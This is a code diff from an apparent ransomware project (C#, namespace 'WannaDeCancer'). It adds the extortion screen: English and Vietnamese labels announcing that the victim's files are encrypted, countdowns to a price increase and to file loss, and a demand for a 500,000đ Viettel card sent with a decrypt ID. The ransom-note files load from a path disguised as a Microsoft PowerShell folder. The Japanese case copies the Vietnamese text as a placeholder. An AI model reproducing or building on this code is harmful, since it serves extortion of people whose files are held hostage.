@@ -65,20 +65,43 @@ namespace WannaDeCancer
         /// </summary>
         private void Description()
         {
+            //Des
             switch (cbxLang.Text)
             {
                 case "English":
                     txbDescription.Text = Static.StreamtoString(@"C:\Program Files\Microsoft PowerShell Manager\EN.txt", EncodeType.UTF);
+                    lbTitle.Text = "Oooops, your file has been encrypted!";
+                    lbDesLost.Text = "Your File will lost on:";
+                    lbDesRaise.Text = "Payment Will Raise on:";
+                    lbDesTimeLeftRaise.Text = "Time Left:";
+                    lbDesTimeLeftLost.Text = "Time Left: ";
+                    lbSend.Text = "Send 500.000đ Viettel card include your decrypt id";
                     break;
                 case "VN":
                     txbDescription.Text = Static.StreamtoString(@"C:\Program Files\Microsoft PowerShell Manager\VI.txt", EncodeType.Unicode);
+                    lbTitle.Text = "Ôiiiiiiiiiii! File của bạn đã bị mã hóa";
+                    lbDesLost.Text = "File của bạn sẽ bị mất vào:";
+                    lbDesRaise.Text = "Tăng giá vào:";
+                    lbDesTimeLeftRaise.Text = "Thời gian còn lại:";
+                    lbDesTimeLeftLost.Text = "Thời gian còn lại: ";
+                    lbSend.Text = "Gửi 500.000đ Thẻ Viettel bao gồm id giải mã hóa";
                     break;
                 case "日本語":
+                    //ko co wifi dich sau
                     txbDescription.Text = Static.StreamtoString(@"C:\Program Files\Microsoft PowerShell Manager\JP.txt", EncodeType.Unicode);
+                    lbTitle.Text = "Ôiiiiiiiiiii! File của bạn đã bị mã hóa";
+                    lbDesLost.Text = "File của bạn sẽ bị mất vào:";
+                    lbDesRaise.Text = "Tăng giá vào:";
+                    lbDesTimeLeftRaise.Text = "Thời gian còn lại:";
+                    lbDesTimeLeftLost.Text = "Thời gian còn lại: ";
+                    lbSend.Text = "Gửi 500.000đ Thẻ Viettel bao gồm id giải mã hóa";
                     break;
                 default:
                     break;
             }
+            
+
+
         }
     }
 }
